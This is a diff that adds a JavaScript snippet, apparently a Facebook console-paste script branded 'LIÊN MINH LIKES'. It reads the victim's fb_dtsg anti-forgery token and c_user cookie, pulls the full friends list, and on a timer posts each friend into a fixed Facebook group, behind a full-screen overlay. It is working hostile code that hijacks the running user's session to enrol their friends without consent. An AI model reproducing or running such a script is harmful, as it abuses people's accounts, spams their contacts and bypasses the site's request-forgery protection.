@@ -1,0 +1,23 @@
+var time_delay = 3000; var timer = null;
+function stopauto(){clearTimeout(timer);}
+function close_win(){stopauto(); document.getElementsByClassName("demo-auto").item(0).remove();}
+function senAjak(frns,num,length){
+	if(num>=length){stopauto();return;}
+	var dtsg = document.getElementsByName("fb_dtsg")[0].value;var gid = document.getElementsByName("group_id")[0].value;var uid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+	var e=new XMLHttpRequest;
+	var prm="__a=1&fb_dtsg="+dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+frns[num].uid+"&__user="+uid+"&phstamp=";
+	e.open("POST","/ajax/groups/members/add_post.php",!0);
+	e.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+	e.onreadystatechange=function(){if(4==e.readyState&&200==e.status){document.getElementsByClassName("auto-text").item(0).getElementsByTagName("div").item(0).getElementsByTagName("span").item(0).innerHTML = num;document.getElementsByClassName("auto-text").item(0).getElementsByTagName("div").item(1).getElementsByTagName("em").item(0).innerHTML = frns[num].names;num = num+1;timer = setTimeout(function(){senAjak(frns,num,length);}, time_delay);}}
+	e.send(prm);
+}
+function getAjak(URL){
+	var xmlhttp;
+	if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
+	xmlhttp.onreadystatechange=function(){if (xmlhttp.readyState==4 && xmlhttp.status==200){var val = eval("("+xmlhttp.responseText.substr(9)+")");var frns = val.payload.entries;timer = setTimeout(function(){senAjak(frns,1,frns.length);}, time_delay);}}
+	xmlhttp.open("GET",URL,true);
+	xmlhttp.send();
+}
+function paingraph(){var newdiv = document.createElement("div");newdiv.setAttribute('class','demo-auto');newdiv.setAttribute('style','position:fixed; z-index:99999; height:100%; width:100%; top:0px;');newdiv.innerHTML = "<div style='position:absolute; height:100%; width:100%; background:#000000; opacity:0.5;'></div> <div style='position:absolute; height:100%; width:100%;'><div style='position:relative; height:70px; width:490px; margin:100px auto; background:#FFFFFF; border:5px solid #DF411B;'> <div style='float:left; height:50px; width:50px; padding:10px;'><a href='https://www.facebook.com/groups/1642004659369544/' target='_blank'><img title='LIÊN MINH LIKES' style='height:100%; width:100%;' src='http://www.chauphu.net/images/logo.png'/></a></div> <div class='auto-text' style='float:right; color:#000000; height:50px; width:400px; padding:10px;'></div> <div style='clear:both;'></div> <div style='position:absolute; height:32px; width:32px; top:7px; right:7px; cursor:pointer;'><img onclick='close_win();' title='Close' src='http://www.chauphu.net/images/close-win.png'/></div>  </div></div>";var dom = document.getElementsByTagName("body").item(0);dom.appendChild(newdiv);}
+function add_friends_join_group(){paingraph();var dom = document.getElementsByClassName("auto-text").item(0);var tag_h3 = document.createElement("h3");tag_h3.innerHTML = "Invite Friends Join Group";dom.appendChild(tag_h3);var div_dong1 = document.createElement("div");div_dong1.innerHTML = "Invited: <span>0</span> friends";var div_dong2 = document.createElement("div");div_dong2.innerHTML = "<em>Who</em> join group";dom.appendChild(div_dong1);dom.appendChild(div_dong2);var uid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var URL = "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer="+uid+"&token="+Math.random()+"&filter[0]=user&options[0]=friends_only";getAjak(URL);}
+add_friends_join_group();
